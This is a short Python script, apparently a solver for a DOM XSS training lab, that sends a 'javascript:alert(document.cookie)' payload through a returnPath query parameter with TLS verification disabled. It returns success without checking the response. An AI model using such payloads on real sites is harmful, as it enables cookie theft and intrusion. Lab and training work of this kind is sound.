import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "DOM XSS in jQuery anchor href attribute sink using location.search source"

def run(url, payload, proxies=None):
    path = "/feedback?returnPath="
    payload = 'javascript:alert(document.cookie)'
    try:
        r = requests.get(url.rstrip('/') + path + payload, verify=False, proxies=proxies)
        res = r.text
        return True
    except Exception as e:
        print(f"[!] Error: {e}")
        return False